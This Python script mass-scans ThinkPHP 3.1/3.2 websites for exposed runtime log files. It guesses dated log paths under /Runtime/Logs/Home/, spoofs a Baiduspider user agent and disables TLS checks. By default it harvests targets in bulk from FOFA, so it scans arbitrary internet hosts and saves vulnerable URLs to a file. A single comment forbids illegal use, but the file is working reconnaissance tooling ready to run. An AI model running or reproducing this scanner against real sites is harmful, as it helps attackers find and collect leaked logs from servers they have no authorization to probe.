# -*- coding: utf-8 -*-
# @author: K0uSAOF
# @date: 2023/1/10 14:12

"""
说明：本脚本用于扫描识别thinkphp 3.1 3.2的日志文件
禁止将该脚本用于非法用途！！！
"""
import requests
import threading
from rich.console import Console
from argparse import ArgumentParser
from queue import Queue
import random
from pocsuite3.api import Fofa
from pocsuite3.lib.core.data import logger

requests.packages.urllib3.disable_warnings()
console = Console()
arg = ArgumentParser(description='ThinkphpLogScanner')
arg.add_argument('-u', '--url', help='The target url', dest='target')
arg.add_argument('-sY', '--start-year', help='The year the scan began. Default: 22.', dest='syear', type=int,default=22)
arg.add_argument('-eY', '--end-year', help='The year the scan end. Defalut: 23', dest='eyear', type=int,default=23)
arg.add_argument('-p','--page',help='The number of pages searched using FOFA. Defalut: 10',dest='page_count',type=int,default=10)
arg.add_argument('-t', '--thread', help='The number of threads.Default value is 10', dest='thread_count', type=int, default=10)
arg.add_argument('--proxy',help='The setting of proxy. Example: http://127.0.0.1:31120',dest='proxy',default='')
arg.add_argument('-f','--file',help='The file of target list',dest='target_list',default='')
arg.add_argument('-o', '--outfile', help='The file location where the results are saved. Default: vuln.txt', dest='outfile', default='vuln.txt')
option = arg.parse_args()

class ThinkphpLogScan(threading.Thread):
    def __init__(self,que=''):
        threading.Thread.__init__(self)
        self.thinkphp_3_1_log_path = "/Runtime/Logs/Home/"
        self.thinkphp_3_2_log_path = "/Application/Runtime/Logs/Home/"
        self.headers = {"User-Agent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"}
        self.proxies = {'http':f'{option.proxy}','https':f'{option.proxy}'}
        self._que = que
        self.syear = option.syear # the year of  start cracking log
        self.eyear = option.eyear # the year of stop cracking log

    def _verify(self,target):
        '''
        Detect whether the target has a log leak
        :return: (None)
        '''
        mouth = str(random.randint(1, 12))
        day = str(random.randint(1,31))
        log_format = f"{self.syear}_{mouth.rjust(2, '0')}_{day.rjust(2, '0')}.log"
        verify_url_1 = f"{target}{self.thinkphp_3_1_log_path}{log_format}"
        verify_url_2 = f"{target}{self.thinkphp_3_2_log_path}{log_format}"
        try:
            logger.info(f"Start verify:{target} request url:{verify_url_1}.")
            if self.proxies['http']:
                logger.info(f"http proxy:{self.proxies['http']} https proxy:{self.proxies['https']}")
            res_1 = requests.get(verify_url_1,headers=self.headers,allow_redirects= False,verify=False,timeout=5,proxies=self.proxies)
            logger.info(f"Start verify:{target} Request url:{verify_url_2}")
            res_2 = requests.get(verify_url_2, headers=self.headers,allow_redirects= False,verify=False, timeout=5, proxies=self.proxies)

            if (res_1.status_code == 200 and "INFO" in res_1.text) or res_1.headers['Content-Type'] == "application/octet-stream":
                logger.info(f"Successfully found log url :) --> {verify_url_1}")
                with open(option.outfile,'a') as f:
                    f.write(verify_url_1 + '\n')

            elif (res_2.status_code == 200 and "INFO" in res_2.text) or res_2.headers['Content-Type'] == "application/octet-stream":
                logger.info(f"Successfully found log url :) {verify_url_2}")
                with open(option.outfile, 'a') as f:
                    f.write(verify_url_2 + '\n')
            else:
                logger.warning(f"Not found log file  {target} :(")
        except Exception as e:
            logger.error(f"Error in verify {target}, error info: {e}")

    def run(self):
        '''
        overwrite run function of Tread
        '''
        while not self._que.empty():
            target = self._que.get()
            try:
                self._verify(target)
            except Exception as e:
                logger.error(f"Error: {e}")
def main():
    threads = []
    thread_count = option.thread_count
    que = Queue()

    # 单个目标检测
    if option.target:
        ThinkphpLogScan()._verify(option.target)

    # 批量扫描文件中的目标
    elif option.target_list:
        with open(option.target_list, 'r') as f:
            for url in f.readlines():
                url = url.replace('\n', '')
                que.put(url)
        for t in range(thread_count):
            threads.append(ThinkphpLogScan(que))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    # 调用FOFA获取目标批量检测
    else:
        fa = Fofa()
        logger.info("Fetch data from fofa,please wait for a time...")
        urls = fa.search('app="thinkphp"', resource='web', pages=option.page_count)
        for url in urls:
            que.put(url)
        for t in range(thread_count):
            threads.append(ThinkphpLogScan(que))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
         logger.error(f"Error: {e}. Use option --help to see usage")



    
    